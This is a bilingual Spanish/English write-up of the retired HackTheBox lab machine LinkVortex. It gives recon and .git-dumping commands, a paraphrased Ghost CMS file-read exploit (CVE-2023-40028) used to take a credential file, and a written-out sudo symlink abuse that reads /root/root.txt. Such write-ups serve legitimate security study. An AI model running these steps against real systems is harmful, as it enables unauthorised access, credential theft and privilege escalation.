# LinkVortex [Easy]

> **ES:** Máquina Linux Easy con Ghost CMS y vhost de desarrollo que expone `.git`; credenciales en historial, LFI autenticado (CVE-2023-40028) y privesc con symlink + sudo.
> **EN:** Easy Linux box with Ghost CMS and a dev vhost exposing `.git`; creds in history, authenticated file read (CVE-2023-40028), and symlink + sudo privesc.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/LinkVortex] |
| **URL** | https://app.hackthebox.com/machines/LinkVortex |
| **IP lab** | 10.10.11.47 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía Ghost (login + file-read) hasta SSH como `bob` y abuso de `clean_symlink.sh` con sudo.
> **EN:** Get `user.txt` and `root.txt` via Ghost (login + file read) to SSH as `bob` and abuse of `clean_symlink.sh` with sudo.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] gobuster vhost / dirsearch
- [ ] GitHack (dump de `.git` expuesto)
- [ ] Exploit público CVE-2023-40028 (lectura de ficheros Ghost)
- [ ] ssh / sudo -l / análisis de capabilities

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Solo 22 y 80; el HTTP redirige a `linkvortex.htb`. Añadir a `/etc/hosts`.
> **EN:** Only 22 and 80; HTTP redirects to `linkvortex.htb`. Add to `/etc/hosts`.

```bash
nmap -sC -sV -p- -oN nmap_init 10.10.11.47
echo '10.10.11.47 linkvortex.htb dev.linkvortex.htb' | sudo tee -a /etc/hosts
```

**Resultado / Result:** Apache + Ghost; vhost `dev.linkvortex.htb` descubierto. Capturas en `img/` original.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** El footer indica Ghost; fuzz de vhosts halla `dev`. En `dev` hay `.git/` listado → volcarlo; en el Dockerfile se ve Ghost 5.58.0 y en tests aparecen credenciales.
> **EN:** Footer shows Ghost; vhost fuzzing finds `dev`. `dev` lists `.git/` → dump it; the Dockerfile shows Ghost 5.58.0 and tests leak credentials.

```bash
gobuster vhost -u http://linkvortex.htb/ --append-domain -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
dirsearch -u http://dev.linkvortex.htb/
python3 GitHack.py http://dev.linkvortex.htb/.git/
grep -R "password" dev.linkvortex.htb/ 2>/dev/null
```

**Resultado / Result:** Credencial de pruebas válida para el panel `/ghost/` (ver notas locales, no se reproduce aquí literal).

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Login en Ghost y lectura arbitraria de ficheros (CVE-2023-40028) para obtener `/var/lib/ghost/config.production.json`, que contiene credenciales SMTP → reutilizar en SSH como `bob`.
> **EN:** Log in to Ghost and perform arbitrary file read (CVE-2023-40028) to fetch `/var/lib/ghost/config.production.json`, holding SMTP creds → reuse over SSH as `bob`.

```bash
# Concepto (parafraseado): autenticarse en /ghost/ y pedir lectura de un path absoluto
ssh bob@linkvortex.htb
whoami; id
```

**Resultado / Result:** Acceso SSH como `bob`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Leer `user.txt` del home de `bob` (flag no publicada).
> **EN:** Read `user.txt` from `bob`'s home (flag not published).

```bash
ls -la /home/bob/
cat /home/bob/user.txt  # solo en lab retirado
```

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `sudo -l` permite `(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png` con `env_keep+=CHECK_CONTENT`. El script limpia symlinks `.png`; abusar con un symlink `.png → /root/*` y `CHECK_CONTENT` para leer/escribir fuera del jail.
> **EN:** `sudo -l` allows `(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png` with `env_keep+=CHECK_CONTENT`. The script cleans `.png` symlinks; abuse with a `.png symlink → /root/*` and `CHECK_CONTENT` to read/write outside the jail.

```bash
sudo -l
cat /opt/ghost/clean_symlink.sh
# Idea (parafraseada): crear link .png apuntando al objetivo y ejecutar el script con sudo
ln -s /root/root.txt ./pwn.png
sudo CHECK_CONTENT=cat /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
cat /root/root.txt  # solo en lab retirado
```

**Resultado / Result:** Root por symlink race/limpieza insegura con sudo NOPASSWD.

---

## 🧠 Lo aprendido / Learned

> **ES:** Riesgo de exponer `.git` en dev; credenciales en tests/Docker; LFI autenticado en Ghost; privesc con scripts sudo que siguen symlinks y variables de entorno heredadas.
> **EN:** Risk of exposing `.git` on dev; creds in tests/Docker; authenticated file read on Ghost; privesc via sudo scripts following symlinks and inherited env vars.

- [ ] Vhost fuzzing + GitHack
- [ ] CVE-2023-40028 (Ghost file read)
- [ ] Abuso de `clean_symlink.sh` + `CHECK_CONTENT`

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Notas locales `index.md` + capturas en `img/` (contenido propio previo, sin normalizar)
- **Walkthrough de referencia:** [verificar en app.hackthebox.com/machines/LinkVortex]
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Nota original en chino/inglés migrada al molde bilingüe ES/EN; flags ofuscadas, credenciales no reproducidas literalmente.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
